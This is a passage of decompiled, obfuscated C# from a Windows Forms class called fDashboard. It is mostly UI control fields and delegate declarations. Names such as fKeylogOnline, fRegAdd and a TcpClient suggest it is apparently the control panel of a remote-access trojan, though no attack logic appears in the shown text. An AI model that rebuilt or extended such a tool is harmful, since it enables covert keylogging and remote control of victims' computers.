	// Token: 0x040002CC RID: 716
	private GClass7 gclass7_3;

	// Token: 0x040002CD RID: 717
	private ContextMenuStrip contextMenuStrip_7;

	// Token: 0x040002CE RID: 718
	private ToolStripMenuItem toolStripMenuItem_86;

	// Token: 0x040002CF RID: 719
	private ToolStripMenuItem toolStripMenuItem_87;

	// Token: 0x040002D0 RID: 720
	private StatusStrip statusStrip_2;

	// Token: 0x040002D1 RID: 721
	private ToolStripStatusLabel toolStripStatusLabel_8;

	// Token: 0x040002D2 RID: 722
	private ToolStripStatusLabel toolStripStatusLabel_9;

	// Token: 0x040002D3 RID: 723
	private ToolStripStatusLabel toolStripStatusLabel_10;

	// Token: 0x040002D4 RID: 724
	private ToolStripStatusLabel toolStripStatusLabel_11;

	// Token: 0x040002D5 RID: 725
	private ToolStripStatusLabel toolStripStatusLabel_12;

	// Token: 0x040002D6 RID: 726
	private ToolStripProgressBar toolStripProgressBar_1;

	// Token: 0x040002D7 RID: 727
	private ToolStripMenuItem toolStripMenuItem_88;

	// Token: 0x040002D8 RID: 728
	private ToolStripMenuItem toolStripMenuItem_89;

	// Token: 0x040002D9 RID: 729
	private ToolStripMenuItem toolStripMenuItem_90;

	// Token: 0x040002DA RID: 730
	private TabPage tabPage_10;

	// Token: 0x040002DB RID: 731
	private GClass7 gclass7_4;

	// Token: 0x040002DC RID: 732
	private ContextMenuStrip contextMenuStrip_8;

	// Token: 0x040002DD RID: 733
	private ToolStripMenuItem toolStripMenuItem_91;

	// Token: 0x040002DE RID: 734
	private ToolStripSeparator toolStripSeparator_18;

	// Token: 0x040002DF RID: 735
	private ToolStripMenuItem toolStripMenuItem_92;

	// Token: 0x040002E0 RID: 736
	private ToolStripMenuItem toolStripMenuItem_93;

	// Token: 0x040002E1 RID: 737
	private ToolStripSeparator toolStripSeparator_19;

	// Token: 0x040002E2 RID: 738
	private ToolStripMenuItem toolStripMenuItem_94;

	// Token: 0x040002E3 RID: 739
	private ToolStripMenuItem toolStripMenuItem_95;

	// Token: 0x040002E4 RID: 740
	private ToolStripSeparator toolStripSeparator_20;

	// Token: 0x040002E5 RID: 741
	private ToolStripMenuItem toolStripMenuItem_96;

	// Token: 0x040002E6 RID: 742
	private ToolStripSeparator toolStripSeparator_21;

	// Token: 0x040002E7 RID: 743
	private ToolStripSeparator toolStripSeparator_22;

	// Token: 0x040002E8 RID: 744
	private ToolStripStatusLabel toolStripStatusLabel_13;

	// Token: 0x040002E9 RID: 745
	private Button button_0;

	// Token: 0x040002EA RID: 746
	private Button button_1;

	// Token: 0x040002EB RID: 747
	private Button button_2;

	// Token: 0x040002EC RID: 748
	private Button button_3;

	// Token: 0x040002ED RID: 749
	private ComboBox comboBox_7;

	// Token: 0x040002EE RID: 750
	private ToolStripMenuItem toolStripMenuItem_97;

	// Token: 0x040002EF RID: 751
	private ToolStripMenuItem toolStripMenuItem_98;

	// Token: 0x040002F0 RID: 752
	private TabPage tabPage_11;

	// Token: 0x040002F1 RID: 753
	private Label label_22;

	// Token: 0x040002F2 RID: 754
	private PictureBox pictureBox_3;

	// Token: 0x040002F3 RID: 755
	private RichTextBox richTextBox_3;

	// Token: 0x040002F4 RID: 756
	private StatusStrip statusStrip_3;

	// Token: 0x040002F5 RID: 757
	private ToolStripStatusLabel toolStripStatusLabel_14;

	// Token: 0x040002F6 RID: 758
	private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_3;

	// Token: 0x040002F7 RID: 759
	private ZeroitProgressIndicator zeroitProgressIndicator_0;

	// Token: 0x040002F8 RID: 760
	private StatusStrip statusStrip_4;

	// Token: 0x040002F9 RID: 761
	private ToolStripStatusLabel toolStripStatusLabel_15;

	// Token: 0x040002FA RID: 762
	private ToolStripStatusLabel toolStripStatusLabel_16;

	// Token: 0x040002FB RID: 763
	private StatusStrip statusStrip_5;

	// Token: 0x040002FC RID: 764
	private ToolStripStatusLabel toolStripStatusLabel_17;

	// Token: 0x040002FD RID: 765
	private ToolStripStatusLabel toolStripStatusLabel_18;

	// Token: 0x040002FE RID: 766
	private ToolStripStatusLabel toolStripStatusLabel_19;

	// Token: 0x040002FF RID: 767
	private ToolStripStatusLabel toolStripStatusLabel_20;

	// Token: 0x04000300 RID: 768
	private ToolStripProgressBar toolStripProgressBar_2;

	// Token: 0x04000301 RID: 769
	private StatusStrip statusStrip_6;

	// Token: 0x04000302 RID: 770
	private ToolStripStatusLabel toolStripStatusLabel_21;

	// Token: 0x04000303 RID: 771
	private ToolStripStatusLabel toolStripStatusLabel_22;

	// Token: 0x04000304 RID: 772
	private ToolStripStatusLabel toolStripStatusLabel_23;

	// Token: 0x04000305 RID: 773
	private ToolStripStatusLabel toolStripStatusLabel_24;

	// Token: 0x04000306 RID: 774
	private ToolStripStatusLabel toolStripStatusLabel_25;

	// Token: 0x04000307 RID: 775
	private ToolStripProgressBar toolStripProgressBar_3;

	// Token: 0x04000308 RID: 776
	private ZeroitProgressIndicator zeroitProgressIndicator_1;

	// Token: 0x04000309 RID: 777
	private RichTextBox richTextBox_4;

	// Token: 0x0400030A RID: 778
	private ZeroitProgressIndicator zeroitProgressIndicator_2;

	// Token: 0x0400030B RID: 779
	private Label label_23;

	// Token: 0x0400030C RID: 780
	private Label label_24;

	// Token: 0x0400030D RID: 781
	private Button button_4;

	// Token: 0x0400030E RID: 782
	private TabPage tabPage_12;

	// Token: 0x0400030F RID: 783
	private ToolStripMenuItem toolStripMenuItem_99;

	// Token: 0x04000310 RID: 784
	private ContextMenuStrip contextMenuStrip_9;

	// Token: 0x04000311 RID: 785
	private ToolStripMenuItem toolStripMenuItem_100;

	// Token: 0x04000312 RID: 786
	private ToolStripSeparator toolStripSeparator_23;

	// Token: 0x04000313 RID: 787
	private ToolStripMenuItem toolStripMenuItem_101;

	// Token: 0x04000314 RID: 788
	private ToolStripMenuItem toolStripMenuItem_102;

	// Token: 0x04000315 RID: 789
	private ToolStripSeparator toolStripSeparator_24;

	// Token: 0x04000316 RID: 790
	private ToolStripMenuItem toolStripMenuItem_103;

	// Token: 0x04000317 RID: 791
	private ToolStripSeparator toolStripSeparator_25;

	// Token: 0x04000318 RID: 792
	private StatusStrip statusStrip_7;

	// Token: 0x04000319 RID: 793
	private ToolStripStatusLabel toolStripStatusLabel_26;

	// Token: 0x0400031A RID: 794
	private ToolStripProgressBar toolStripProgressBar_4;

	// Token: 0x0400031B RID: 795
	private ZeroitProgressIndicator zeroitProgressIndicator_3;

	// Token: 0x0400031C RID: 796
	private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_4;

	// Token: 0x0400031D RID: 797
	private GClass7 gclass7_5;

	// Token: 0x0400031E RID: 798
	private GClass7 gclass7_6;

	// Token: 0x0400031F RID: 799
	private ZeroitProgressIndicator zeroitProgressIndicator_4;

	// Token: 0x04000320 RID: 800
	private ZeroitProgressIndicator zeroitProgressIndicator_5;

	// Token: 0x04000321 RID: 801
	private Label label_25;

	// Token: 0x04000322 RID: 802
	private BackgroundWorker backgroundWorker_1;

	// Token: 0x04000323 RID: 803
	private ToolStripMenuItem toolStripMenuItem_104;

	// Token: 0x04000324 RID: 804
	private TabPage tabPage_13;

	// Token: 0x04000325 RID: 805
	private ZeroitProgressIndicator zeroitProgressIndicator_6;

	// Token: 0x04000326 RID: 806
	private StatusStrip statusStrip_8;

	// Token: 0x04000327 RID: 807
	private ToolStripStatusLabel toolStripStatusLabel_27;

	// Token: 0x04000328 RID: 808
	private ToolStripStatusLabel toolStripStatusLabel_28;

	// Token: 0x04000329 RID: 809
	private ToolStripProgressBar toolStripProgressBar_5;

	// Token: 0x0400032A RID: 810
	private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_5;

	// Token: 0x0400032B RID: 811
	private GClass7 gclass7_7;

	// Token: 0x0400032C RID: 812
	private ContextMenuStrip contextMenuStrip_10;

	// Token: 0x0400032D RID: 813
	private ToolStripMenuItem toolStripMenuItem_105;

	// Token: 0x0400032E RID: 814
	private ToolStripSeparator toolStripSeparator_26;

	// Token: 0x0400032F RID: 815
	private ToolStripMenuItem toolStripMenuItem_106;

	// Token: 0x04000330 RID: 816
	private ToolStripMenuItem toolStripMenuItem_107;

	// Token: 0x04000331 RID: 817
	private ToolStripSeparator toolStripSeparator_27;

	// Token: 0x04000332 RID: 818
	private ToolStripMenuItem toolStripMenuItem_108;

	// Token: 0x04000333 RID: 819
	private ToolStripSeparator toolStripSeparator_28;

	// Token: 0x04000334 RID: 820
	private ToolStripMenuItem toolStripMenuItem_109;

	// Token: 0x04000335 RID: 821
	private ToolStripMenuItem toolStripMenuItem_110;

	// Token: 0x04000336 RID: 822
	private ToolStripMenuItem toolStripMenuItem_111;

	// Token: 0x04000337 RID: 823
	private ToolStripMenuItem toolStripMenuItem_112;

	// Token: 0x04000338 RID: 824
	private ToolStripMenuItem toolStripMenuItem_113;

	// Token: 0x04000339 RID: 825
	private ToolStripMenuItem toolStripMenuItem_114;

	// Token: 0x0400033A RID: 826
	private ToolStripSeparator toolStripSeparator_29;

	// Token: 0x0400033B RID: 827
	private ToolStripMenuItem toolStripMenuItem_115;

	// Token: 0x0400033C RID: 828
	private TabPage tabPage_14;

	// Token: 0x0400033D RID: 829
	private ZeroitProgressIndicator zeroitProgressIndicator_7;

	// Token: 0x0400033E RID: 830
	private StatusStrip statusStrip_9;

	// Token: 0x0400033F RID: 831
	private ToolStripStatusLabel toolStripStatusLabel_29;

	// Token: 0x04000340 RID: 832
	private ToolStripProgressBar toolStripProgressBar_6;

	// Token: 0x04000341 RID: 833
	private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_6;

	// Token: 0x04000342 RID: 834
	private GClass7 gclass7_8;

	// Token: 0x04000343 RID: 835
	private ToolStripMenuItem toolStripMenuItem_116;

	// Token: 0x04000344 RID: 836
	private ContextMenuStrip contextMenuStrip_11;

	// Token: 0x04000345 RID: 837
	private ToolStripMenuItem toolStripMenuItem_117;

	// Token: 0x04000346 RID: 838
	private ToolStripSeparator toolStripSeparator_30;

	// Token: 0x04000347 RID: 839
	private ToolStripMenuItem toolStripMenuItem_118;

	// Token: 0x04000348 RID: 840
	private ToolStripMenuItem toolStripMenuItem_119;

	// Token: 0x04000349 RID: 841
	private ToolStripMenuItem toolStripMenuItem_120;

	// Token: 0x0400034A RID: 842
	private ToolStripMenuItem toolStripMenuItem_121;

	// Token: 0x0400034B RID: 843
	private ToolStripMenuItem toolStripMenuItem_122;

	// Token: 0x0400034C RID: 844
	private ToolStripSeparator toolStripSeparator_31;

	// Token: 0x0400034D RID: 845
	private ToolStripMenuItem toolStripMenuItem_123;

	// Token: 0x0400034E RID: 846
	private ToolStripSeparator toolStripSeparator_32;

	// Token: 0x0400034F RID: 847
	private ToolStripMenuItem toolStripMenuItem_124;

	// Token: 0x04000350 RID: 848
	private ToolStripMenuItem toolStripMenuItem_125;

	// Token: 0x04000351 RID: 849
	private ToolStripSeparator toolStripSeparator_33;

	// Token: 0x04000352 RID: 850
	private ToolStripMenuItem toolStripMenuItem_126;

	// Token: 0x04000353 RID: 851
	private ToolStripMenuItem toolStripMenuItem_127;

	// Token: 0x04000354 RID: 852
	private ToolStripSeparator toolStripSeparator_34;

	// Token: 0x04000355 RID: 853
	private ToolStripMenuItem toolStripMenuItem_128;

	// Token: 0x04000356 RID: 854
	private ToolStripStatusLabel toolStripStatusLabel_30;

	// Token: 0x04000357 RID: 855
	private ToolStripStatusLabel toolStripStatusLabel_31;

	// Token: 0x04000358 RID: 856
	private System.Windows.Forms.Timer timer_2;

	// Token: 0x04000359 RID: 857
	private ToolStripStatusLabel toolStripStatusLabel_32;

	// Token: 0x0400035A RID: 858
	private ToolStripStatusLabel toolStripStatusLabel_33;

	// Token: 0x0400035B RID: 859
	private ToolStripStatusLabel toolStripStatusLabel_34;

	// Token: 0x0400035C RID: 860
	private ToolStripStatusLabel toolStripStatusLabel_35;

	// Token: 0x0400035D RID: 861
	private CheckBox checkBox_5;

	// Token: 0x0400035E RID: 862
	private PictureBox pictureBox_4;

	// Token: 0x0400035F RID: 863
	private PictureBox pictureBox_5;

	// Token: 0x04000360 RID: 864
	private CheckBox checkBox_6;

	// Token: 0x04000361 RID: 865
	private VisualButton visualButton_3;

	// Token: 0x04000362 RID: 866
	private VisualScrollBar visualScrollBar_0;

	// Token: 0x04000363 RID: 867
	private ToolStripSeparator toolStripSeparator_35;

	// Token: 0x04000364 RID: 868
	private VisualButton visualButton_4;

	// Token: 0x04000365 RID: 869
	private VisualButton visualButton_5;

	// Token: 0x04000366 RID: 870
	private VisualButton visualButton_6;

	// Token: 0x04000367 RID: 871
	private VisualButton visualButton_7;

	// Token: 0x04000368 RID: 872
	private VisualButton visualButton_8;

	// Token: 0x04000369 RID: 873
	private VisualButton visualButton_9;

	// Token: 0x0400036A RID: 874
	private VisualButton visualButton_10;

	// Token: 0x0400036B RID: 875
	private VisualButton visualButton_11;

	// Token: 0x0400036C RID: 876
	private VisualButton visualButton_12;

	// Token: 0x0400036D RID: 877
	private VisualButton visualButton_13;

	// Token: 0x0400036E RID: 878
	private VisualButton visualButton_14;

	// Token: 0x0400036F RID: 879
	private VisualScrollBar visualScrollBar_1;

	// Token: 0x04000370 RID: 880
	private VisualScrollBar visualScrollBar_2;

	// Token: 0x04000371 RID: 881
	private GClass7 gclass7_9;

	// Token: 0x04000372 RID: 882
	private GClass7 gclass7_10;

	// Token: 0x04000373 RID: 883
	private TabPage tabPage_15;

	// Token: 0x04000374 RID: 884
	private Button button_5;

	// Token: 0x04000375 RID: 885
	private Button button_6;

	// Token: 0x04000376 RID: 886
	private Button button_7;

	// Token: 0x04000377 RID: 887
	private Button button_8;

	// Token: 0x04000378 RID: 888
	private StatusStrip statusStrip_10;

	// Token: 0x04000379 RID: 889
	private ToolStripStatusLabel toolStripStatusLabel_36;

	// Token: 0x0400037A RID: 890
	private ToolStripStatusLabel toolStripStatusLabel_37;

	// Token: 0x0400037B RID: 891
	private ToolStripStatusLabel toolStripStatusLabel_38;

	// Token: 0x0400037C RID: 892
	private ToolStripStatusLabel toolStripStatusLabel_39;

	// Token: 0x0400037D RID: 893
	private ToolStripProgressBar toolStripProgressBar_7;

	// Token: 0x0400037E RID: 894
	private VisualButton visualButton_15;

	// Token: 0x0400037F RID: 895
	private ComboBox comboBox_8;

	// Token: 0x04000380 RID: 896
	private GClass7 gclass7_11;

	// Token: 0x04000381 RID: 897
	private GClass7 gclass7_12;

	// Token: 0x04000382 RID: 898
	private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_7;

	// Token: 0x04000383 RID: 899
	private ZeroitProgressIndicator zeroitProgressIndicator_8;

	// Token: 0x04000384 RID: 900
	private ToolStripMenuItem toolStripMenuItem_129;

	// Token: 0x04000385 RID: 901
	private ContextMenuStrip contextMenuStrip_12;

	// Token: 0x04000386 RID: 902
	private ToolStripMenuItem toolStripMenuItem_130;

	// Token: 0x04000387 RID: 903
	private ToolStripSeparator toolStripSeparator_36;

	// Token: 0x04000388 RID: 904
	private ToolStripMenuItem toolStripMenuItem_131;

	// Token: 0x04000389 RID: 905
	private ContextMenuStrip contextMenuStrip_13;

	// Token: 0x0400038A RID: 906
	private ToolStripMenuItem toolStripMenuItem_132;

	// Token: 0x0400038B RID: 907
	private ToolStripSeparator toolStripSeparator_37;

	// Token: 0x0400038C RID: 908
	private ToolStripMenuItem toolStripMenuItem_133;

	// Token: 0x0400038D RID: 909
	private BackgroundWorker backgroundWorker_2;

	// Token: 0x0400038E RID: 910
	private ToolStripMenuItem toolStripMenuItem_134;

	// Token: 0x0400038F RID: 911
	private TabPage tabPage_16;

	// Token: 0x04000390 RID: 912
	private VisualButton visualButton_16;

	// Token: 0x04000391 RID: 913
	private VisualButton visualButton_17;

	// Token: 0x04000392 RID: 914
	private TextBox textBox_0;

	// Token: 0x04000393 RID: 915
	private Label label_26;

	// Token: 0x04000394 RID: 916
	private TextBox textBox_1;

	// Token: 0x04000395 RID: 917
	private Label label_27;

	// Token: 0x04000396 RID: 918
	private System.Windows.Forms.Timer timer_3;

	// Token: 0x04000397 RID: 919
	private Label label_28;

	// Token: 0x04000398 RID: 920
	private VisualButton visualButton_18;

	// Token: 0x04000399 RID: 921
	private VisualButton visualButton_19;

	// Token: 0x0400039A RID: 922
	private VisualButton visualButton_20;

	// Token: 0x0400039B RID: 923
	private VisualButton visualButton_21;

	// Token: 0x0400039C RID: 924
	private VisualButton visualButton_22;

	// Token: 0x0400039D RID: 925
	private PictureBox pictureBox_6;

	// Token: 0x0400039E RID: 926
	private Label label_29;

	// Token: 0x0400039F RID: 927
	private BackgroundWorker backgroundWorker_3;

	// Token: 0x040003A0 RID: 928
	private ToolStripMenuItem toolStripMenuItem_135;

	// Token: 0x040003A1 RID: 929
	private ToolStripSeparator toolStripSeparator_38;

	// Token: 0x040003A2 RID: 930
	private VisualButton visualButton_23;

	// Token: 0x040003A3 RID: 931
	private CheckBox checkBox_7;

	// Token: 0x040003A4 RID: 932
	public fThumb fThumb_0;

	// Token: 0x040003A5 RID: 933
	public fRegAdd fRegAdd_0;

	// Token: 0x040003A6 RID: 934
	public string string_0;

	// Token: 0x040003A7 RID: 935
	public string string_1;

	// Token: 0x040003A8 RID: 936
	public string string_2;

	// Token: 0x040003A9 RID: 937
	public string string_3;

	// Token: 0x040003AA RID: 938
	public string string_4;

	// Token: 0x040003AB RID: 939
	public string string_5;

	// Token: 0x040003AC RID: 940
	public TcpClient tcpClient_0;

	// Token: 0x040003AD RID: 941
	public GClass1 gclass1_0;

	// Token: 0x040003AE RID: 942
	public string string_6;

	// Token: 0x040003AF RID: 943
	private string string_7;

	// Token: 0x040003B0 RID: 944
	private Collection collection_0;

	// Token: 0x040003B1 RID: 945
	private string string_8;

	// Token: 0x040003B2 RID: 946
	private Collection collection_1;

	// Token: 0x040003B3 RID: 947
	private ConcurrentStack<Class130.Struct19> concurrentStack_0;

	// Token: 0x040003B4 RID: 948
	private int int_0;

	// Token: 0x040003B5 RID: 949
	private int int_1;

	// Token: 0x040003B6 RID: 950
	private int int_2;

	// Token: 0x040003B7 RID: 951
	private fDashboard.Class128 class128_0;

	// Token: 0x040003B8 RID: 952
	public Point point_0;

	// Token: 0x040003B9 RID: 953
	public MouseEventArgs mouseEventArgs_0;

	// Token: 0x040003BA RID: 954
	public object object_0;

	// Token: 0x040003BB RID: 955
	private string string_9;

	// Token: 0x040003BC RID: 956
	private long long_0;

	// Token: 0x040003BD RID: 957
	private bool bool_0;

	// Token: 0x040003BE RID: 958
	private StringBuilder stringBuilder_0;

	// Token: 0x040003BF RID: 959
	private string string_10;

	// Token: 0x040003C0 RID: 960
	private string string_11;

	// Token: 0x040003C1 RID: 961
	private bool bool_1;

	// Token: 0x040003C2 RID: 962
	public fKeylogOnline fKeylogOnline_0;

	// Token: 0x040003C3 RID: 963
	private bool bool_2;

	// Token: 0x040003C4 RID: 964
	public int int_3;

	// Token: 0x040003C5 RID: 965
	public int int_4;

	// Token: 0x040003C6 RID: 966
	public ConcurrentStack<RawSourceWaveStream> concurrentStack_1;

	// Token: 0x040003C7 RID: 967
	public ConcurrentStack<WaveFormat> concurrentStack_2;

	// Token: 0x040003C8 RID: 968
	private ImageList imageList_1;

	// Token: 0x040003C9 RID: 969
	private ImageList imageList_2;

	// Token: 0x040003CA RID: 970
	private ImageList imageList_3;

	// Token: 0x040003CB RID: 971
	private int int_5;

	// Token: 0x040003CC RID: 972
	private GClass9 gclass9_0;

	// Token: 0x040003CD RID: 973
	private Process process_0;

	// Token: 0x020000A9 RID: 169
	internal sealed class Class123
	{
		// Token: 0x0600098A RID: 2442 RVA: 0x00006C0C File Offset: 0x00004E0C
		internal void _Lambda$__0()
		{
			this.fDashboard_0.method_116(this.fDashboard_0.concurrentStack_1.ElementAtOrDefault(this.int_0));
		}

		// Token: 0x040003CE RID: 974
		public int int_0;

		// Token: 0x040003CF RID: 975
		public fDashboard fDashboard_0;
	}

	// Token: 0x020000AA RID: 170
	internal sealed class Class124
	{
		// Token: 0x0600098C RID: 2444 RVA: 0x00051528 File Offset: 0x0004F728
		internal void _Lambda$__0()
		{
			fDashboard fDashboard_ = this.class125_0.fDashboard_0;
			FolderBrowserDialog folderBrowserDialog_;
			string selectedPath = (folderBrowserDialog_ = this.class125_0.folderBrowserDialog_0).SelectedPath;
			fDashboard_.method_50(ref selectedPath, ref this.string_0);
			folderBrowserDialog_.SelectedPath = selectedPath;
		}

		// Token: 0x040003D0 RID: 976
		public string string_0;

		// Token: 0x040003D1 RID: 977
		public fDashboard.Class125 class125_0;
	}

	// Token: 0x020000AB RID: 171
	internal sealed class Class125
	{
		// Token: 0x040003D2 RID: 978
		public FolderBrowserDialog folderBrowserDialog_0;

		// Token: 0x040003D3 RID: 979
		public fDashboard fDashboard_0;
	}

	// Token: 0x020000AC RID: 172
	// (Invoke) Token: 0x06000991 RID: 2449
	private delegate void Delegate2(ref string string_0);

	// Token: 0x020000AD RID: 173
	// (Invoke) Token: 0x06000995 RID: 2453
	private delegate void Delegate3(ref string string_0);

	// Token: 0x020000AE RID: 174
	// (Invoke) Token: 0x06000999 RID: 2457
	private delegate void Delegate4(ref string string_0, Color color_0);

	// Token: 0x020000AF RID: 175
	private sealed class Class126
	{
		// Token: 0x0600099A RID: 2458 RVA: 0x00051568 File Offset: 0x0004F768
		public Class126(string string_9, string string_10, string string_11, string string_12, string string_13, string string_14, string string_15, string string_16, string string_17, Image image_1)
		{
			this.string_0 = string_9;
			this.string_1 = string_10;
			this.string_2 = string_11;
			this.string_3 = string_12;
			this.string_4 = string_13;
			this.string_5 = string_14;
			this.string_6 = string_15;
			this.string_7 = string_16;
			this.string_8 = string_17;
			this.image_0 = image_1;
		}

		// Token: 0x040003D4 RID: 980
		public string string_0;

		// Token: 0x040003D5 RID: 981
		public string string_1;

		// Token: 0x040003D6 RID: 982
		public string string_2;

		// Token: 0x040003D7 RID: 983
		public string string_3;

		// Token: 0x040003D8 RID: 984
		public string string_4;

		// Token: 0x040003D9 RID: 985
		public string string_5;

		// Token: 0x040003DA RID: 986
		public string string_6;

		// Token: 0x040003DB RID: 987
		public string string_7;

		// Token: 0x040003DC RID: 988
		public string string_8;

		// Token: 0x040003DD RID: 989
		public Image image_0;
	}

	// Token: 0x020000B0 RID: 176
	// (Invoke) Token: 0x0600099E RID: 2462
	private delegate void Delegate5(ref string string_0);

	// Token: 0x020000B1 RID: 177
	// (Invoke) Token: 0x060009A2 RID: 2466
	private delegate void Delegate6(ref string string_0);

	// Token: 0x020000B2 RID: 178
	// (Invoke) Token: 0x060009A6 RID: 2470
	private delegate void Delegate7(ref string string_0, string string_1);

	// Token: 0x020000B3 RID: 179
	internal sealed class Class127
	{
		// Token: 0x060009A7 RID: 2471 RVA: 0x00006C2F File Offset: 0x00004E2F
		public Class127() : this(null, null)
		{
		}

		// Token: 0x060009A8 RID: 2472 RVA: 0x00006C39 File Offset: 0x00004E39
		public Class127(string string_1) : this(string_1, null)
		{
		}

		// Token: 0x060009A9 RID: 2473 RVA: 0x00006C43 File Offset: 0x00004E43
		public Class127(string string_1, Image image_1)
		{
			this.method_1(string_1);
			this.method_3(image_1);
		}

		// Token: 0x060009AA RID: 2474 RVA: 0x00006C59 File Offset: 0x00004E59
		public string method_0()
		{
			return this.string_0;
		}

		// Token: 0x060009AB RID: 2475 RVA: 0x00006C61 File Offset: 0x00004E61
		public void method_1(string string_1)
		{
			this.string_0 = string_1;
		}

		// Token: 0x060009AC RID: 2476 RVA: 0x00006C6A File Offset: 0x00004E6A
		public Image method_2()
		{
			return this.image_0;
		}

		// Token: 0x060009AD RID: 2477 RVA: 0x00006C72 File Offset: 0x00004E72
		public void method_3(Image image_1)
		{
			this.image_0 = image_1;
		}

		// Token: 0x040003DE RID: 990
		private string string_0;

		// Token: 0x040003DF RID: 991
		private Image image_0;
	}

	// Token: 0x020000B4 RID: 180
	// (Invoke) Token: 0x060009B1 RID: 2481
	private delegate void Delegate8(ref string string_0);

	// Token: 0x020000B5 RID: 181
	// (Invoke) Token: 0x060009B5 RID: 2485
	private delegate void Delegate9(ref string string_0);

	// Token: 0x020000B6 RID: 182
	// (Invoke) Token: 0x060009B9 RID: 2489
	private delegate void Delegate10(ref string string_0);

	// Token: 0x020000B7 RID: 183
	// (Invoke) Token: 0x060009BD RID: 2493
	private delegate void Delegate11(ref long long_0);

	// Token: 0x020000B8 RID: 184
	// (Invoke) Token: 0x060009C1 RID: 2497
	private delegate void Delegate12(ref string[] string_0);

	// Token: 0x020000B9 RID: 185
	// (Invoke) Token: 0x060009C5 RID: 2501
	private delegate void Delegate13();

	// Token: 0x020000BA RID: 186
	// (Invoke) Token: 0x060009C9 RID: 2505
	private delegate void Delegate14(ref long long_0, ref string string_0);

	// Token: 0x020000BB RID: 187
	private sealed class Class128
	{
		// Token: 0x060009CA RID: 2506 RVA: 0x00006C7B File Offset: 0x00004E7B
		public Class128(string string_6, string string_7, string string_8, string string_9, string string_10, string string_11, Image image_1)
		{
			this.string_0 = string_6;
			this.string_1 = string_7;
			this.string_2 = string_8;
			this.string_3 = string_9;
			this.string_4 = string_10;
			this.string_5 = string_11;
			this.image_0 = image_1;
		}

		// Token: 0x040003E0 RID: 992
		public string string_0;

		// Token: 0x040003E1 RID: 993
		public string string_1;

		// Token: 0x040003E2 RID: 994
		public string string_2;

		// Token: 0x040003E3 RID: 995
		public string string_3;

		// Token: 0x040003E4 RID: 996
		public string string_4;

		// Token: 0x040003E5 RID: 997
		public string string_5;

		// Token: 0x040003E6 RID: 998
		public Image image_0;
	}

	// Token: 0x020000BC RID: 188
	// (Invoke) Token: 0x060009CE RID: 2510
	private delegate void Delegate15(ref string[] string_0);

	// Token: 0x020000BD RID: 189
	// (Invoke) Token: 0x060009D2 RID: 2514
	private delegate void Delegate16(ref string string_0);

	// Token: 0x020000BE RID: 190
	// (Invoke) Token: 0x060009D6 RID: 2518
	private delegate void Delegate17(ref bool bool_0);

	// Token: 0x020000BF RID: 191
	// (Invoke) Token: 0x060009DA RID: 2522
	private delegate void Delegate18(ref long long_0, ref string string_0);

	// Token: 0x020000C0 RID: 192
	// (Invoke) Token: 0x060009DE RID: 2526
	private delegate void Delegate19(ref string string_0);

	// Token: 0x020000C1 RID: 193
	// (Invoke) Token: 0x060009E2 RID: 2530
	private delegate void Delegate20(ref string string_0);

	// Token: 0x020000C2 RID: 194
	// (Invoke) Token: 0x060009E6 RID: 2534
	private delegate void Delegate21(ref string string_0);

	// Token: 0x020000C3 RID: 195
	// (Invoke) Token: 0x060009EA RID: 2538
	private delegate void Delegate22(ref string string_0);

	// Token: 0x020000C4 RID: 196
	// (Invoke) Token: 0x060009EE RID: 2542
	private delegate void Delegate23(ref bool bool_0);

	// Token: 0x020000C5 RID: 197
	// (Invoke) Token: 0x060009F2 RID: 2546
	private delegate void Delegate24();

	// Token: 0x020000C6 RID: 198
	// (Invoke) Token: 0x060009F6 RID: 2550
	private delegate void Delegate25(ref string string_0);

	// Token: 0x020000C7 RID: 199
	// (Invoke) Token: 0x060009FA RID: 2554
	private delegate void Delegate26(ref string string_0);

	// Token: 0x020000C8 RID: 200
	// (Invoke) Token: 0x060009FE RID: 2558
	private delegate void Delegate27();

	// Token: 0x020000C9 RID: 201
	// (Invoke) Token: 0x06000A02 RID: 2562
	private delegate void Delegate28(string string_0);

	// Token: 0x020000CA RID: 202
	// (Invoke) Token: 0x06000A06 RID: 2566
	private delegate void Delegate29();

	// Token: 0x020000CB RID: 203
	// (Invoke) Token: 0x06000A0A RID: 2570
	private delegate void Delegate30();

	// Token: 0x020000CC RID: 204
	// (Invoke) Token: 0x06000A0E RID: 2574
	private delegate void Delegate31(int int_0);

	// Token: 0x020000CD RID: 205
	// (Invoke) Token: 0x06000A12 RID: 2578
	private delegate void Delegate32(ref string string_0);

	// Token: 0x020000CE RID: 206
	// (Invoke) Token: 0x06000A16 RID: 2582
	private delegate void Delegate33();

	// Token: 0x020000CF RID: 207
	// (Invoke) Token: 0x06000A1A RID: 2586
	private delegate void Delegate34(ref string string_0);

	// Token: 0x020000D0 RID: 208
	// (Invoke) Token: 0x06000A1E RID: 2590
	private delegate void Delegate35(ref string string_0);

	// Token: 0x020000D1 RID: 209
	// (Invoke) Token: 0x06000A22 RID: 2594
	private delegate void Delegate36(ref string string_0);

	// Token: 0x020000D2 RID: 210
	// (Invoke) Token: 0x06000A26 RID: 2598
	private delegate void Delegate37(string string_0, Color color_0);

	// Token: 0x020000D3 RID: 211
	// (Invoke) Token: 0x06000A2A RID: 2602
	private delegate void Delegate38(ref bool bool_0);

	// Token: 0x020000D4 RID: 212
	// (Invoke) Token: 0x06000A2E RID: 2606
	private delegate void Delegate39(ref string string_0, string string_1);

	// Token: 0x020000D5 RID: 213
	// (Invoke) Token: 0x06000A32 RID: 2610
	private delegate void Delegate40(ref string string_0);

	// Token: 0x020000D6 RID: 214
	// (Invoke) Token: 0x06000A36 RID: 2614
	private delegate void Delegate41();

	// Token: 0x020000D7 RID: 215
	// (Invoke) Token: 0x06000A3A RID: 2618
	private delegate void Delegate42(ref long long_0);
}
